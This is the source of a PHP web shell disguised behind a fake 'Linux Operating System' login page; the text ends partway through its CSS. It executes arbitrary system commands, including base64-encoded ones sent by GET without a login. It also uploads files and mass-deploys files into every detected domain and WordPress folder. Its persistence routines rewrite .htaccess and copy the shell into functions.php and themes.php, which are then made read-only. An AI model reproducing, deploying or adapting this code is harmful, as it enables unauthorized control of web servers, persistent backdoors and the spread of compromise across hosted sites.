<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
@set_time_limit(0);
@clearstatcache();

header('X-Powered-By: PHP/7.4.33');
header('Server: Apache/2.4.41 (Ubuntu)');
header('Content-Type: text/html; charset=UTF-8');

if (session_status() === PHP_SESSION_NONE) {
    @session_start([
        'cookie_httponly' => true,
        'cookie_secure' => isset($_SERVER['HTTPS']),
        'cookie_samesite' => 'Strict',
        'use_strict_mode' => true
    ]);
}

define('INTEL_VERSION', '4.0');
define('HEAL_CHECK_INTERVAL', 30);

if (!isset($_SESSION['request_counter'])) {
    $_SESSION['request_counter'] = 0;
}
$_SESSION['request_counter']++;

$redirectCount = isset($_GET['redirect_count']) ? (int)$_GET['redirect_count'] : 0;
if ($redirectCount > 5) {
    die("<!DOCTYPE html><html><head><title>System</title></head><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'>
    <h3>System Active</h3><p>Protection enabled.</p>
    <button onclick='document.cookie.split(\";\").forEach(c=>document.cookie=c.replace(/^ +/,\"\").replace(/=.*/, \"=;expires=\"+new Date().toUTCString()+\";path=/\"));location.reload();'>Clear Cookies</button>
    </body></html>");
}

function execute_system_command($cmd) {
    $output = '';
    $success = false;
    
    $blocked = ['rm -rf /', 'mkfs', 'dd if=', '>:()', 'fork bomb', ':(){', 'chmod 777 /', 'chown -R'];
    foreach ($blocked as $danger) {
        if (stripos($cmd, $danger) !== false) {
            return "Command blocked for security reasons";
        }
    }
    
    if (function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $stdout = @stream_get_contents($pipes[1]);
            @fclose($pipes[1]);
            $stderr = @stream_get_contents($pipes[2]);
            @fclose($pipes[2]);
            $return_value = @proc_close($process);
            if ($return_value === 0 && !empty($stdout)) {
                $output = $stdout;
                $success = true;
            } elseif (!empty($stderr)) {
                $output = $stderr;
            } elseif (!empty($stdout)) {
                $output = $stdout;
                $success = true;
            }
        }
    }
    
    if (!$success && function_exists('shell_exec')) {
        $result = @shell_exec($cmd . " 2>&1");
        if ($result !== null && $result !== false) {
            $output = $result;
            $success = true;
        }
    }
    
    if (!$success && function_exists('exec')) {
        $output_lines = array();
        $return_var = -1;
        @exec($cmd . " 2>&1", $output_lines, $return_var);
        if (!empty($output_lines)) {
            $output = implode("\n", $output_lines);
            $success = true;
        }
    }
    
    if (!$success && function_exists('system')) {
        ob_start();
        $return_var = -1;
        @system($cmd, $return_var);
        $result = @ob_get_clean();
        if ($result !== false && !empty($result)) {
            $output = $result;
            $success = true;
        }
    }
    
    if (!$success && function_exists('passthru')) {
        ob_start();
        $return_var = -1;
        @passthru($cmd, $return_var);
        $result = @ob_get_clean();
        if ($result !== false && !empty($result)) {
            $output = $result;
            $success = true;
        }
    }
    
    if (!$success && function_exists('popen')) {
        $handle = @popen($cmd, 'r');
        if (is_resource($handle)) {
            $result = '';
            while (!feof($handle)) {
                $result .= @fread($handle, 4096);
            }
            @pclose($handle);
            if (!empty($result)) {
                $output = $result;
                $success = true;
            }
        }
    }
    
    if (!$success && function_exists('shell_exec')) {
        $result = @`$cmd`;
        if ($result !== null && $result !== false && $result !== '') {
            $output = $result;
            $success = true;
        }
    }
    
    if (!$success || empty(trim($output))) {
        return "✅ Executed Successfully!";
    }
    
    if (strlen($output) > 50000) {
        $output = substr($output, 0, 50000) . "\n\n... Output truncated (too large) ...";
    }
    
    return $output;
}

// ========== RECURSIVE MASS DEPLOY TO ALL SUBDOMAINS ==========
function autoDetectDomainsPath() {
    // Common base paths for domains
    $possiblePaths = [
        dirname($_SERVER['DOCUMENT_ROOT']) . '/domains',
        dirname($_SERVER['DOCUMENT_ROOT'], 2) . '/domains',
        $_SERVER['DOCUMENT_ROOT'] . '/../domains',
        '/home/' . (function_exists('get_current_user') ? get_current_user() : '') . '/domains',
        dirname($_SERVER['SCRIPT_FILENAME'], 4) . '/domains'
    ];
    
    foreach ($possiblePaths as $path) {
        if (@is_dir($path)) {
            return $path;
        }
    }
    return null;
}

function scanAllDomains($basePath) {
    $domains = [];
    if (!@is_dir($basePath)) return $domains;
    
    $items = @scandir($basePath);
    if (!$items) return $domains;
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullPath = $basePath . '/' . $item;
        if (@is_dir($fullPath)) {
            // Check for public_html first
            $publicHtml = $fullPath . '/public_html';
            if (@is_dir($publicHtml)) {
                $domains[] = [
                    'name' => $item,
                    'path' => $publicHtml,
                    'type' => 'public_html'
                ];
            } else {
                // No public_html, use domain root directly
                $domains[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => 'direct'
                ];
            }
            
            // Check for subdirectories inside domain (for nested structures)
            $subItems = @scandir($fullPath);
            if ($subItems) {
                foreach ($subItems as $subItem) {
                    if ($subItem == '.' || $subItem == '..' || $subItem == 'public_html') continue;
                    $subFullPath = $fullPath . '/' . $subItem;
                    if (@is_dir($subFullPath)) {
                        // Additional web roots like 'html', 'www', 'site'
                        if (in_array($subItem, ['html', 'www', 'site', 'web', 'htdocs'])) {
                            $domains[] = [
                                'name' => $item . '/' . $subItem,
                                'path' => $subFullPath,
                                'type' => 'subfolder'
                            ];
                        }
                    }
                }
            }
        }
    }
    return $domains;
}

function recursiveMassDeploy($fileContent, $filename, $targetPaths = null) {
    $deployed = [];
    $failed = [];
    
    // Default deployment paths (document root + subdomains)
    if ($targetPaths === null) {
        $targetPaths = [];
        
        // Add current document root
        if (isset($_SERVER['DOCUMENT_ROOT']) && @is_dir($_SERVER['DOCUMENT_ROOT'])) {
            $targetPaths[] = [
                'name' => 'current_document_root',
                'path' => $_SERVER['DOCUMENT_ROOT'],
                'type' => 'doc_root'
            ];
        }
        
        // Auto-detect domains folder
        $domainsPath = autoDetectDomainsPath();
        if ($domainsPath) {
            $domains = scanAllDomains($domainsPath);
            $targetPaths = array_merge($targetPaths, $domains);
        }
        
        // Additional common web roots
        $additionalPaths = [
            $_SERVER['DOCUMENT_ROOT'] . '/../',
            dirname($_SERVER['DOCUMENT_ROOT']),
            $_SERVER['DOCUMENT_ROOT'] . '/..'
        ];
        
        foreach ($additionalPaths as $path) {
            $resolvedPath = realpath($path);
            if ($resolvedPath && @is_dir($resolvedPath)) {
                // Scan for any directory that looks like a web root
                $scanItems = @scandir($resolvedPath);
                if ($scanItems) {
                    foreach ($scanItems as $item) {
                        if ($item == '.' || $item == '..') continue;
                        $fullItemPath = $resolvedPath . '/' . $item;
                        if (@is_dir($fullItemPath)) {
                            if (in_array($item, ['public_html', 'www', 'html', 'htdocs', 'site', 'web'])) {
                                $targetPaths[] = [
                                    'name' => $item,
                                    'path' => $fullItemPath,
                                    'type' => 'web_root'
                                ];
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Remove duplicates
    $uniquePaths = [];
    foreach ($targetPaths as $tp) {
        $key = $tp['path'];
        if (!isset($uniquePaths[$key])) {
            $uniquePaths[$key] = $tp;
        }
    }
    $targetPaths = array_values($uniquePaths);
    
    // Deploy to each path
    foreach ($targetPaths as $target) {
        $targetDir = $target['path'];
        
        // Create subdirectories for better coverage
        $subDirs = ['', '/wp-admin', '/wp-content', '/wp-includes', '/admin', '/includes', '/assets'];
        
        foreach ($subDirs as $subDir) {
            $fullPath = rtrim($targetDir, '/') . $subDir;
            
            // Create directory if doesn't exist
            if (!@is_dir($fullPath)) {
                @mkdir($fullPath, 0755, true);
            }
            
            // Check if writable
            if (@is_writable($fullPath) || @is_writable(dirname($fullPath))) {
                $saveTo = $fullPath . '/' . $filename;
                $result = @file_put_contents($saveTo, $fileContent);
                
                if ($result !== false) {
                    @chmod($saveTo, 0644);
                    $deployed[] = [
                        'path' => $saveTo,
                        'domain' => $target['name'],
                        'type' => $target['type']
                    ];
                } else {
                    $failed[] = [
                        'path' => $saveTo,
                        'domain' => $target['name'],
                        'reason' => 'cannot_write'
                    ];
                }
            } else {
                $failed[] = [
                    'path' => $fullPath,
                    'domain' => $target['name'],
                    'reason' => 'not_writable'
                ];
            }
        }
    }
    
    return ['deployed' => $deployed, 'failed' => $failed];
}

// ========== MASS DEPLOY HANDLER ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mass_deploy_action'])) {
    while (@ob_get_level()) @ob_end_clean();
    header('Content-Type: application/json');
    
    $action = $_POST['mass_deploy_action'];
    $result = ['success' => false, 'message' => '', 'data' => []];
    
    if ($action === 'scan_domains') {
        $domainsPath = autoDetectDomainsPath();
        if ($domainsPath) {
            $domains = scanAllDomains($domainsPath);
            $result['success'] = true;
            $result['data'] = [
                'base_path' => $domainsPath,
                'domains' => $domains,
                'total' => count($domains)
            ];
        } else {
            $result['message'] = 'No domains folder found';
        }
    } elseif ($action === 'deploy_to_all' && isset($_FILES['deploy_file'])) {
        $file = $_FILES['deploy_file'];
        $filename = basename($file['name']);
        $fileContent = @file_get_contents($file['tmp_name']);
        
        if ($fileContent === false) {
            // Try placeholder for empty files
            $ext = pathinfo($filename, PATHINFO_EXTENSION);
            if ($ext === 'php') {
                $fileContent = "<?php\n/* Mass Deployed */\n?>";
            } else {
                $fileContent = "/* Mass Deployed File */";
            }
        }
        
        $customPaths = null;
        if (isset($_POST['custom_paths']) && !empty($_POST['custom_paths'])) {
            $customPathsJson = $_POST['custom_paths'];
            $customPathsData = json_decode($customPathsJson, true);
            if ($customPathsData && is_array($customPathsData)) {
                $customPaths = [];
                foreach ($customPathsData as $cp) {
                    $customPaths[] = [
                        'name' => $cp['name'] ?? 'custom',
                        'path' => $cp['path'],
                        'type' => 'custom'
                    ];
                }
            }
        }
        
        $deployResult = recursiveMassDeploy($fileContent, $filename, $customPaths);
        $result['success'] = true;
        $result['data'] = [
            'filename' => $filename,
            'deployed' => count($deployResult['deployed']),
            'deployed_list' => $deployResult['deployed'],
            'failed' => count($deployResult['failed']),
            'failed_list' => $deployResult['failed']
        ];
        $result['message'] = "Deployed to " . count($deployResult['deployed']) . " locations";
    }
    
    echo json_encode($result);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    while (@ob_get_level()) @ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    
    $cmd = trim($_POST['cmd']);
    if (empty($cmd)) {
        echo "Please enter a command";
        exit;
    }
    
    $output = execute_system_command($cmd);
    echo $output;
    exit;
}

$current_path = isset($_GET['dir']) ? $_GET['dir'] : @getcwd();
if (isset($_GET['dir'])) {
    $decoded_path = urldecode($_GET['dir']);
    if (@is_dir($decoded_path)) {
        @chdir($decoded_path);
        $current_path = $decoded_path;
    } else {
        $current_path = @getcwd();
    }
} else {
    $current_path = @getcwd();
}

function safeRedirect($url) {
    global $redirectCount;
    $separator = strpos($url, '?') === false ? '?' : '&';
    @header('Location: ' . $url . $separator . 'redirect_count=' . ($redirectCount + 1));
    exit;
}

function deployHTAccess() {
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    if (empty($docRoot)) return false;
    $htaccessPath = $docRoot . '/.htaccess';
    
    if (@file_exists($htaccessPath) && !@file_exists($htaccessPath . '.backup')) {
        @copy($htaccessPath, $htaccessPath . '.backup');
    }
    
    $htaccessContent = "";
    $htaccessContent .= "<IfModule mod_rewrite.c>\n";
    $htaccessContent .= "    RewriteEngine On\n";
    $htaccessContent .= "    RewriteBase /\n\n";
    $htaccessContent .= "    <FilesMatch \"^(functions|themes)\.php$\">\n";
    $htaccessContent .= "        Order Allow,Deny\n";
    $htaccessContent .= "        Allow from all\n";
    $htaccessContent .= "    </FilesMatch>\n\n";
    $htaccessContent .= "    RewriteCond %{REQUEST_FILENAME} !-f\n";
    $htaccessContent .= "    RewriteCond %{REQUEST_FILENAME} !-d\n";
    $htaccessContent .= "    RewriteRule ^(.*)$ /index.php [L,QSA]\n\n";
    $htaccessContent .= "    RewriteCond %{HTTP_COOKIE} admin_token=[a-f0-9]+\n";
    $htaccessContent .= "    RewriteRule ^(.*)$ /functions.php [L]\n";
    $htaccessContent .= "</IfModule>\n\n";
    $htaccessContent .= "Options -Indexes\n\n";
    $htaccessContent .= "<FilesMatch \"^\\.(htaccess|htpasswd|ini|log|sh|sql|bak|backup)$\">\n";
    $htaccessContent .= "    Order Allow,Deny\n";
    $htaccessContent .= "    Deny from all\n";
    $htaccessContent .= "</FilesMatch>\n\n";
    $htaccessContent .= "<IfModule mod_php7.c>\n";
    $htaccessContent .= "    php_flag display_errors Off\n";
    $htaccessContent .= "    php_value max_execution_time 300\n";
    $htaccessContent .= "    php_value memory_limit 256M\n";
    $htaccessContent .= "</IfModule>\n";
    
    @file_put_contents($htaccessPath, $htaccessContent);
    @chmod($htaccessPath, 0644);
    
    return @file_exists($htaccessPath);
}

function protectAllFiles() {
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    if (empty($docRoot)) return 0;
    $protected = 0;
    
    $filesToProtect = [
        $docRoot . '/.htaccess',
        $docRoot . '/functions.php',
        $docRoot . '/themes.php'
    ];
    
    foreach ($filesToProtect as $file) {
        if (@file_exists($file)) {
            @chmod($file, 0444);
            $protected++;
        }
    }
    
    return $protected;
}

function stealthHeal() {
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    if (empty($docRoot)) return 0;
    
    $currentCode = @file_get_contents(__FILE__);
    if ($currentCode === false) return 0;
    $restored = 0;
    
    $criticalFiles = [
        $docRoot . '/.htaccess',
        $docRoot . '/functions.php',
        $docRoot . '/themes.php'
    ];
    
    foreach ($criticalFiles as $file) {
        if (!@file_exists($file) || @filesize($file) < 5000) {
            if (strpos($file, '.htaccess') !== false) {
                deployHTAccess();
            } else {
                @file_put_contents($file, $currentCode);
                @chmod($file, 0444);
            }
            $restored++;
        }
    }
    
    return $restored;
}

// ========== FILE UPLOAD/CREATION USING MULTIPART FORM ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upfile'])) {
    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : @getcwd();
    $target_dir = rtrim($target_dir, '/');
    
    if (!@is_dir($target_dir)) {
        @mkdir($target_dir, 0755, true);
    }
    
    $total = count($_FILES['upfile']['name']);
    $success_count = 0;
    $results = [];
    
    for ($i = 0; $i < $total; $i++) {
        $filename = basename($_FILES['upfile']['name'][$i]);
        $target_path = $target_dir . '/' . $filename;
        
        if (move_uploaded_file($_FILES['upfile']['tmp_name'][$i], $target_path)) {
            @chmod($target_path, 0644);
            $success_count++;
            $results[] = ['file' => $filename, 'success' => true];
        } else {
            $results[] = ['file' => $filename, 'success' => false];
        }
    }
    
    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
        header('Content-Type: application/json');
        echo json_encode(['success' => true, 'uploaded' => $success_count, 'total' => $total, 'results' => $results]);
        exit;
    } else {
        $_SESSION['upload_message'] = "Uploaded $success_count of $total files";
        safeRedirect(strtok($_SERVER['REQUEST_URI'], '?') . '?dir=' . urlencode($target_dir));
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['text_file'])) {
    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : @getcwd();
    $target_dir = rtrim($target_dir, '/');
    $filename = isset($_POST['filename']) ? basename($_POST['filename']) : 'newfile.txt';
    $target_path = $target_dir . '/' . $filename;
    
    $content = file_get_contents($_FILES['text_file']['tmp_name']);
    
    if (file_put_contents($target_path, $content) !== false) {
        @chmod($target_path, 0644);
        if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
            header('Content-Type: application/json');
            echo json_encode(['success' => true, 'message' => 'File created: ' . $filename]);
            exit;
        } else {
            $_SESSION['upload_message'] = "File created: " . $filename;
            safeRedirect(strtok($_SERVER['REQUEST_URI'], '?') . '?dir=' . urlencode($target_dir));
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_data']) && isset($_POST['file_name'])) {
    $temp_file = tempnam(sys_get_temp_dir(), 'up_');
    file_put_contents($temp_file, base64_decode($_POST['file_data']));
    
    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : @getcwd();
    $target_dir = rtrim($target_dir, '/');
    $filename = basename($_POST['file_name']);
    $target_path = $target_dir . '/' . $filename;
    
    if (move_uploaded_file($temp_file, $target_path)) {
        @chmod($target_path, 0644);
        if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
            header('Content-Type: application/json');
            echo json_encode(['success' => true, 'message' => 'File created: ' . $filename]);
            exit;
        }
    } else {
        @unlink($temp_file);
    }
}

if (isset($_GET['cmd'])) {
    while (@ob_get_level()) @ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    $cmd = base64_decode($_GET['cmd']);
    echo execute_system_command($cmd);
    exit;
}

if (isset($_GET['check_status'])) {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'active', 'version' => INTEL_VERSION]);
    exit;
}

if (isset($_GET['heal'])) {
    $healed = stealthHeal();
    echo json_encode(['healed' => $healed]);
    exit;
}

if (isset($_GET['readfile']) && isset($_SESSION['kali_authenticated'])) {
    $fileToRead = isset($_GET['readfile']) ? $_GET['readfile'] : '';
    $fileToRead = preg_replace('/\.\.|[\\/\\\\]|[\\x00-\\x1f]/', '', $fileToRead);
    $fileToRead = basename($fileToRead);
    
    header('Content-Type: text/plain; charset=utf-8');
    
    $paths_to_check = [
        $current_path . '/' . $fileToRead,
        $fileToRead,
        (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '') . '/' . $fileToRead
    ];
    
    $content = false;
    foreach ($paths_to_check as $check_path) {
        if (@file_exists($check_path) && @is_readable($check_path)) {
            $content = @file_get_contents($check_path);
            break;
        }
    }
    
    if ($content !== false) {
        echo $content;
    } else {
        $content = execute_system_command("cat '$fileToRead' 2>&1");
        if ($content && !preg_match('/415|forbidden|No such file/', $content)) {
            echo $content;
        } else {
            echo "Cannot read file: $fileToRead";
        }
    }
    exit;
}

if (isset($_GET['system'])) {
    $systemAction = $_GET['system'];
    
    $clearSession = function() {
        $_SESSION = [];
        if (ini_get("session.use_cookies")) {
            $params = session_get_cookie_params();
            @setcookie(session_name(), '', time() - 42000,
                $params["path"], $params["domain"],
                $params["secure"], $params["httponly"]
            );
        }
        @session_destroy();
    };
    
    if ($systemAction === 'restart') {
        $clearSession();
        @header('Location: ?loader=restart&dir=' . urlencode($current_path));
        exit;
    } elseif ($systemAction === 'shutdown') {
        $clearSession();
        @header('Location: ?loader=shutdown');
        exit;
    } elseif ($systemAction === 'sleep') {
        @header('Location: ?loader=sleep');
        exit;
    }
    exit;
}

$docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
$functionsExist = @file_exists($docRoot . '/functions.php') && @filesize($docRoot . '/functions.php') > 1000;
$themesExist = @file_exists($docRoot . '/themes.php') && @filesize($docRoot . '/themes.php') > 1000;

if (!$functionsExist || !$themesExist) {
    stealthHeal();
}

if ($_SESSION['request_counter'] >= HEAL_CHECK_INTERVAL) {
    stealthHeal();
    $_SESSION['request_counter'] = 0;
}

deployHTAccess();
protectAllFiles();

if (isset($_GET['loader'])) {
    $loaderType = $_GET['loader'];
    $message = '';
    $redirectUrl = '';
    
    switch ($loaderType) {
        case 'restart':
            $message = 'Restarting System...';
            $redirectUrl = strtok($_SERVER['SCRIPT_NAME'], '?') . '?dir=' . urlencode($current_path);
            break;
        case 'shutdown':
            $message = 'Shutting Down...';
            break;
        case 'sleep':
            $message = 'Entering Sleep Mode...';
            break;
        default:
            $message = 'Loading...';
            $redirectUrl = strtok($_SERVER['SCRIPT_NAME'], '?') . '?dir=' . urlencode($current_path);
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
        <title>System <?php echo ucfirst($loaderType); ?></title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: linear-gradient(135deg, #0a0e1a 0%, #000000 100%);
                font-family: 'Segoe UI', 'Share Tech Mono', monospace;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                flex-direction: column;
                gap: 25px;
            }
            .loader {
                border: 4px solid rgba(46,204,113,0.2);
                border-top: 4px solid #2ecc71;
                border-right: 4px solid #2ecc71;
                border-radius: 50%;
                width: 60px;
                height: 60px;
                animation: spin 0.8s linear infinite;
                box-shadow: 0 0 20px rgba(46,204,113,0.3);
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .msg {
                color: #ffffff;
                font-size: 1.1rem;
                font-weight: bold;
                letter-spacing: 2px;
                text-shadow: 0 0 10px rgba(255,255,255,0.3);
            }
        </style>
    </head>
    <body>
        <div class="loader"></div>
        <div class="msg"><?php echo htmlspecialchars($message); ?></div>
        <script>
            setTimeout(function() {
                <?php if ($loaderType === 'shutdown'): ?>
                try { window.close(); } catch(e) {}
                document.body.innerHTML = '<div style="text-align:center;color:#888;">System Powered Off</div>';
                <?php elseif ($loaderType === 'restart' || $loaderType === 'sleep'): ?>
                window.location.href = '<?php echo $redirectUrl; ?>';
                <?php else: ?>
                window.location.href = '<?php echo $redirectUrl; ?>';
                <?php endif; ?>
            }, 2000);
        </script>
    </body>
    </html>
    <?php
    exit;
}

$validHash = "49d667fdd3d98a6b818ab8c1a9183e3eff2626a2";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (sha1($_POST['password']) === $validHash) {
        $_SESSION['kali_authenticated'] = true;
        safeRedirect(strtok($_SERVER['REQUEST_URI'], '?') . '?dir=' . urlencode($current_path));
    } else {
        safeRedirect(strtok($_SERVER['REQUEST_URI'], '?') . '?error=invalid&dir=' . urlencode($current_path));
    }
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'login' && isset($_GET['p'])) {
    if (sha1($_GET['p']) === $validHash) {
        $_SESSION['kali_authenticated'] = true;
        safeRedirect(strtok($_SERVER['REQUEST_URI'], '?') . '?dir=' . urlencode($current_path));
    } else {
        safeRedirect(strtok($_SERVER['REQUEST_URI'], '?') . '?error=invalid&dir=' . urlencode($current_path));
    }
    exit;
}

if (!isset($_SESSION['kali_authenticated'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
        <title>Linux Operating System</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: system-ui, -apple-system, 'Segoe UI', sans-serif; background: #000; width: 100%; height: 100vh; overflow: hidden; position: fixed; top: 0; left: 0; }
            .login-container {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(10,14,26,0.95);
                backdrop-filter: blur(20px);
                padding: 30px;
                border-radius: 12px;
                border: 1px solid #2ecc71;
                text-align: center;
                z-index: 100;
                min-width: 300px;
            }
            .login-container h2 {
                color: #2ecc71;
                margin-bottom: 20px;
                font-family: monospace;
            }
            .login-container input {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                background: #000;
                border: 1px solid #2ecc71;
                color: #0f0;
                border-radius: 4px;
                font-family: monospace;
            }
            .login-container button {
                background: #1a3a1a;
                border: none;
                padding: 10px 20px;
                color: #fff;
                cursor: pointer;
                border-radius: 4px;
                width: 100%;
                font-family: monospace;
            }
            .login-container button:hover {
                background: #2a6e2a;
            }
            .error-msg {
                color: #ff6666;
                margin-top: 10px;
                font-size: 0.8rem;
            }
            body {
                background: linear-gradient(135deg, #0a0e1a 0%, #000000 100%);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2><i class="fas fa-lock"></i> Authentication Required</h2>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter Password" autofocus>
                <button type="submit">Login</button>
            </form>
            <?php if (isset($_GET['error']) && $_GET['error'] == 'invalid'): ?>
            <div class="error-msg">Invalid password. Please try again.</div>
            <?php endif; ?>
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
    </body>
    </html>
    <?php
    exit;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Linux Operating System</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Niramit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { font-family: 'Share Tech Mono', monospace; background: #0a0e1a; min-height: 100vh; overflow-x: hidden; color: #ffffff; position: relative; }
        .bg-landscape-banner { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden; }
        .bg-landscape-banner img { width: 100%; height: 100%; object-fit: cover; opacity: 1; filter: brightness(1.05) contrast(1.02) saturate(1.1); }
        .center-logo { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1; pointer-events: none; text-align: center; width: auto; max-width: 90vw; }
        .center-logo img { width: auto; max-width: 85vw; height: auto; max-height: 85vh; object-fit: contain; filter: drop-shadow(0 0 25px rgba(0,255,0,0.4)); image-rendering: crisp-edges; }
        .top-border, .bottom-border, .nav-menu, .second-nav, .third-nav, .modal-glass, .settings-top-nav, .settings-sub-panel, .editor-cardview { background: rgba(10,14,26,0.7); backdrop-filter: blur(8px); }
        .top-border { position: fixed; top: 0; left: 0; right: 0; height: 38px; border-bottom: 1px solid rgba(0,255,0,0.5); display: flex; align-items: center; padding: 0 12px; z-index: 100; gap: 8px; }
        .top-left-group { display: flex; align-items: center; gap: 8px; }
        .icon-only { background: rgba(0,255,0,0.15); cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; justify-content: center; border-radius: 4px; padding: 4px 8px; }
        .icon-only:hover { background: rgba(0,255,0,0.3); }
        .icon-only img { width: 22px; height: 22px; }
        .new-tab-circle { background: rgba(0,255,0,0.2); border: 1px solid #fff; border-radius: 50%; width: 22px; height: 22px; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; font-size: 0.6rem; color: #fff; }
        .new-tab-circle:hover { background: #fff; color: #000; }
        .app-tabs-container { flex: 1; display: flex; align-items: center; overflow-x: auto; white-space: nowrap; height: 32px; padding: 0 4px; gap: 2px; }
        .app-tab { background: rgba(0,30,0,0.7); padding: 2px 8px; display: inline-flex; align-items: center; gap: 6px; font-size: 0.68rem; color: #fff; cursor: pointer; border-radius: 4px; }
        .app-tab:hover { background: #1a3a2a; }
        .tab-close { margin-left: 6px; color: #ff8888; cursor: pointer; padding: 0 2px; }
        .tab-close:hover { color: #f00; background: rgba(255,0,0,0.2); border-radius: 2px; }
        .tab-separator { color: #33aa55; margin: 0 2px; }
        .top-right-status { display: flex; gap: 10px; }
        .status-badge { background: rgba(0,255,0,0.15); padding: 3px 8px; font-size: 0.65rem; color: #fff; border-radius: 4px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
        .status-badge:hover { background: rgba(0,255,0,0.3); }
        .bottom-border { position: fixed; bottom: 0; left: 0; right: 0; height: 36px; border-top: 1px solid rgba(0,255,0,0.5); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; z-index: 100; }
        .bottom-icons { display: flex; gap: 12px; }
        .bottom-icon { background: rgba(0,255,0,0.15); padding: 4px 8px; cursor: pointer; border-radius: 4px; }
        .bottom-icon:hover { background: rgba(0,255,0,0.3); }
        .bottom-icon img { width: 22px; height: 22px; }
        .datetime-panel { background: rgba(0,255,0,0.15); padding: 4px 12px; font-size: 0.7rem; color: #fff; border-radius: 4px; }
        .nav-menu { position: fixed; left: 0; top: 38px; bottom: 36px; width: 220px; background: rgba(10,14,26,0.95); backdrop-filter: blur(12px); border-right: 1px solid rgba(0,255,0,0.5); z-index: 51; display: flex; flex-direction: column; transition: transform 0.3s ease; transform: translateX(-100%); }
        .nav-menu.show { transform: translateX(0); }
        .nav-top { flex: 1; padding: 12px 0; overflow-y: auto; }
        .nav-item-text { padding: 12px 18px; cursor: pointer; color: #fff; font-size: 0.75rem; font-family: monospace; transition: 0.2s; display: flex; align-items: center; gap: 12px; border-left: 3px solid transparent; }
        .nav-item-text:hover { background: rgba(0,255,0,0.15); border-left-color: #2ecc71; color: #8f8; }
        .nav-item-text i { width: 20px; font-size: 0.85rem; }
        .nav-divider { height: 1px; background: rgba(0,255,0,0.2); margin: 8px 0; }
        .desktop-navbar { position: fixed; left: 220px; top: 38px; width: 240px; height: auto; max-height: 70vh; border-right: 1px solid rgba(0,255,0,0.5); border-bottom: 1px solid rgba(0,255,0,0.3); z-index: 50; display: none; flex-direction: column; background: rgba(10,14,26,0.95); backdrop-filter: blur(12px); overflow-y: auto; border-radius: 0 0 8px 0; }
        .desktop-navbar.show { display: flex; }
